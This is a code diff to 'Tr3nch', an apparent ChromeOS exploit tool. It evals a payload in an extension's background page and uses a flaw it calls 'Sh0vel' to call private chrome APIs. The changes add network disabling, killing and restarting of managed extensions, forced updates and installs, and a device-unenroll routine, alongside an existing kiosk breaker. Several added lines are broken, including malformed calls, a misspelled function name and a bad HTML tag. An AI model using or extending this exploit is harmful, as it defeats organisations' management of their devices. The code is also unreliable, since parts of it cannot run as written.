@@ -35,7 +35,7 @@ chrome.runtime.getBackgroundPage((background) => {
 				"sh0vel", and we can use it to not only access private chrome APIs, but also Mojo and WEBUI.*/
 				const asPage=function(code) {
 					let link=window.open('about:blank','_blank');
-					link.location.href=`javascript:(function() {chrome=opener.chrome;${code}})();`;
+					link.location.href=`javascript:(function() {chrome=opener.chrome;console=opener.console;${code}})();`;
 					/* We don't call link.close here as some callbacks need to run before closing, so
 					ALL asPage calls need to have window.close be the last thing that runs unless you need the extra tab */
 				}
@@ -60,7 +60,7 @@ chrome.runtime.getBackgroundPage((background) => {
 							<div class="topBar">
 								<h1>Tr3nch</h1>
 								<p>
-									Current Extension: ${chrome.runtime.getManifest().name} (${chrome.runtime.id}), Current Page: ${window.origin.replace("chrome://","")}
+									Current Extension: ${chrome.runtime.getManifest().name} (${chrome.runtime.id}), Current Page: ${window.origin.replace("chrome://","")}, Chrome Version: R${chromeVer}
 								</p>
 								<a href="https://whelement.me">Whelement Homepage</a>
 								<a href="https://discord.gg/fPU8cUvf">Whelement Discord</a>
@@ -84,6 +84,7 @@ chrome.runtime.getBackgroundPage((background) => {
 									Kelsea: The logo<br>
 									Katie: Testing<br>
 									The rest of Whelement: Mental support<br>
+									${chrome.runtime.getManifest().name}: Being vulnerable to Sh0vel<br>
 								</p>
 							</div>
 						</body>
@@ -267,7 +268,7 @@ chrome.runtime.getBackgroundPage((background) => {
 							];
 							break;
 						case "extensions":
-							return ["killExtensions"];
+							return ["manExtensions"];
 							break;
 						case "os-settings":
 							return [
@@ -396,7 +397,10 @@ chrome.runtime.getBackgroundPage((background) => {
 					addPage('chrome://flags');
 					addPage('chrome://network');
 					addPage('chrome://policy');
-					/*addPage('chrome://oobe'); OOBE isn't available in user sessions. */
+					if (chromeVer < 109) {
+						/* The OOBE can't be accessed from user sessions past R109. */
+						addPage('chrome://oobe');
+					}
 					
 					container.append(redirBox);
 
@@ -499,7 +503,7 @@ chrome.runtime.getBackgroundPage((background) => {
 							});
 						});
 						restartBox.querySelector('#userexit').addEventListener('click', () => {
-							asPage("chrome.send('AttemptUserExit');");
+							asPage("chrome.send('AttemptUserExit');window.close();");
 						});
 
 						container.append(restartBox);
@@ -582,7 +586,7 @@ chrome.runtime.getBackgroundPage((background) => {
 									});
 								}
 								confirmRequest("Warning!", "Continuing further will make all kiosk apps inoperable!<br> Are you sure you want to do this?", () => {
-									asPage(`${attempt.toString()};attempt();`);
+									asPage(`${attempt.toString()};attempt();window.close();`);
 									message("Kiosk Breaker","Kiosks have been broken successfully.");
 								}, () => {
 									message("Request Cancelled","No kiosk accounts have been altered.");
@@ -656,9 +660,13 @@ chrome.runtime.getBackgroundPage((background) => {
 						<hr>
 						<p>Mess around with internet settings.</p>
 						<button id="bringUp">Turn Network On</button>
+						<button id="bringDown">Turn Network Off</button>
 						`;
 						netBox.querySelector('#bringUp').addEventListener('click', () => {
 							asPage("chrome.networkingPrivate.enableNetworkType('All');window.close();");
+						});
+						netBox.querySelector('#bringDown').addEventListener('click', () => {
+							asPage("chrome.networkingPrivate.disableNetworkType('All');window.close();");
 						});
 
 						if (window.origin.includes("settings")) {
@@ -733,19 +741,20 @@ chrome.runtime.getBackgroundPage((background) => {
 
 						container.append(proxyBox);
 					}
-					if (perms.includes("killExtensions")) {
+					if (perms.includes("manExtensions")) {
 						let killBox=document.createElement('div');
 						killBox.innerHTML=`
 						<br>
-						<h1>Extension LoopKiller</h1>
+						<h1>Extension Manager</h1>
 						<hr>
-						<p>Restart or Repeatedly kill an extension by its ID.</p>
+						<p>Manage extensions installed on the device.</p>
 						<label>
 							<input id="killIdBox" placeholder="Extension ID Here">
 						</label>
 						<br>
 						<button id="killIdButton">LoopKill Extension</button>
 						<button id="resIdButton">Restart Extension</button>
+						<button id="updateButton"Update Extensions></button>
 						`;
 						killBox.querySelector('#killIdButton').addEventListener('click', () => {
 							let id=document.querySelector('#killIdBox').value;
@@ -764,20 +773,54 @@ chrome.runtime.getBackgroundPage((background) => {
 						killBox.querySelector('#resIdButton').addEventListener('click', () => {
 							let id=document.querySelector('#killIdBox').value;
 							function restart(id) {
-								/* We want this to work on managed extensions, so reset its configuration to kill it. */
+								/* We would typically use developerPrivate.restart, but that doesn't work on managed
+								extensions, so let's do it my way. */
 								chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: false});
 								chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: true});
 								window.close(); /* We don't want the extra page. */
 							}
-							asPage(`${restart.toString()};restart('${id}');`);
+							asPage(`${restart.toString()};restart('${id}');window.close(();`);
+						});
+						killBox.querySelector('#updateButton').querySelector('click', () => {
+							asPage('chrome.developerPrivate.autoUpdate();window.close();');
+						});
+
+						/* Experimental */
+						document.body.addEventListener('drop', () => {
+							asPage('chrome.developerPrivate.installDroppedFile();window.close();');
 						});
 
 						container.append(killBox);
+					}
+					if (perms.includes("unenroll")) {
+						let oobeBox=document.createElement('div');
+						oobeBox.innerHTML=`
+						<br>
+						<h1>Unenroll</h1>
+						<hr>
+						<p>Remove your device from its current management.</p>
+						<br>
+						<button id="unenrollButton">Deprovision Device</button>
+						`;
+						oobeBox.querySelector('#unenrollButton').addEventListener('click', () => {
+							const unenroll=function() {
+								chrome.send('skipToLoginForTesting');
+								chrome.networkingPrivate.disableNetworkType('All');
+								chrome.send('completeLogin', [Math.floor(Math.random() * (21 ** 10)).toString(), "whopper@gmail.com", "whopper", false]);
+								chrome.send('oauthEnrollAttributes', ['','']);
+								chrome.send('oauthEnrollClose', ['done']);
+							}
+							asPage(`${uneneroll.toString()};unenroll();window.close();`);
+						});
+
+						/* container.append(oobeBox); */ /* For testing! Do not uncomment until it has been proven to work. */
 					}
 					container.append(document.createElement('br')); /* Whitespace just to make me feel better */
 					
 					return container;
 				}
+
+				let chromeVer=navigator.appVersion.match(/Chrom(e|ium)\/([0-9]+)/)[2];
 
 				loadMenuHTML(); /* Load in the base menu */
 				let mainContainer=document.querySelector('#opt-container');
@@ -840,9 +883,7 @@ chrome.runtime.getBackgroundPage((background) => {
 	as the background page to get persistence until the extension restarts */
 	if (background.location.href !== location.href) {
 		background.eval(`${payload.toString()};payload();`);
-
 	}else{
 		payload(); /* If this is already running as the background page then we don't need to use eval. */
 	}
 });
-
